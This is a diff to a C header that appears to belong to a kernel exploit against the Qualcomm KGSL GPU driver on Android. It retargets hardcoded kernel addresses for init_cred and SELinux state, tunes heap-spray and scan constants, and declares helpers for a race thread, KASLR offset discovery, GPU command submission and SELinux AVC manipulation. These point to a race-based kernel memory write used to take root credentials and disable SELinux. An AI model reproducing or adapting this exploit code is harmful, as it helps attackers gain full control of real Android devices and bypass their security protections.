@@ -83,18 +83,17 @@ struct kgsl_cmdstream_readtimestamp_ctxtid { unsigned int context_id, type, time
 #define PLACEHOLDER_ADDR 0x710204000ULL
 #define PLACEHOLDER_SIZE 0x10400000ULL
 
-#define VMLINUX_TEXT      0xffffffee85a80000ULL
-#define VMLINUX_INIT_CRED 0xffffffee8817b738ULL
-#define VMLINUX_SELINUX_STATE 0xffffffee8833a000ULL
-#define VMLINUX_SELINUX_ENFORCING_BOOT 0xffffffee883a7f14ULL
+#define VMLINUX_TEXT      0xffffffc010080000ULL
+#define VMLINUX_INIT_CRED 0xffffffc012197d08ULL
+#define VMLINUX_SELINUX_STATE 0xffffffc0123a4000ULL
+#define VMLINUX_SELINUX_ENFORCING_BOOT 0xffffffc01240744cULL
 
-#define SCAN_DWORDS 1024
 #define SPRAY_PIDS 2000
-#define CRED_COPY_SIZE 0x100
+#define SCAN_DWORDS 560
 
 #define CP_NOP 0x10
-#define CP_MEM_TO_MEM 0x73
 #define CP_MEM_WRITE 0x3D
+#define CP_MEM_TO_MEM 0x73
 
 extern int kgsl_fd;
 extern volatile int race_done;
@@ -105,13 +104,13 @@ uint32_t pm4_parity(uint32_t v);
 uint32_t cp_type7(uint32_t opcode, uint32_t cnt);
 int gpuobj_alloc(int fd, uint64_t size, uint64_t flags);
 void *gpuobj_mmap(int fd, size_t size, unsigned int id);
-int gpuobj_info(int fd, unsigned int id, uint64_t *gpuaddr);
+int gpuobj_info(int fd, unsigned int id, uint64_t *gpuaddr, uint64_t *flags);
 void gpuobj_free(int fd, unsigned int id);
 unsigned int create_context(int fd);
 int wait_timestamp(int fd, unsigned int ctx_id, unsigned int target);
 int submit_ib(int fd, unsigned int ctx_id, uint64_t ib_ga, size_t bytes, unsigned int ib_id, unsigned int *out_ts);
 void *race_thread(void *arg);
-uint64_t get_selinux_state_from_file(void);
+uint64_t get_symbol_from_file(const char *sym);
 uint64_t get_kaslr_offset(void);
 void flush_cpu_cache(void *start, size_t len);
 void gen_avc_entries_enhanced(void);
